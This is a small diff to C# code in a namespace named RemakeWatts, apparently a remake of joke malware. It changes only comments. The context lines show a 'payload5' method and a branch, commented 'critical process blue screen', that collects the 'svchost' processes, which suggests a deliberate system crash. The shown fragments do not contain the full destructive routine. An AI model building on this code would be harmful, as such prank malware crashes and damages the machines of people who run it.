@@ -45,7 +45,7 @@ namespace RemakeWatts
             }
             else
             {
-                //Proceskrytyczny_blue_screen
+                // Proceskrytyczny_blue_screen
                 Process[] processes = Process.GetProcessesByName("svchost");
                 foreach (var proc in processes)
                 {
@@ -95,7 +95,8 @@ namespace RemakeWatts
             thread.SetApartmentState(ApartmentState.STA);
             thread.Start();
         }
-        //Turbotacka
+        // Tapeta :)
+        
         public void payload5()
         {
             new Thread(() =>
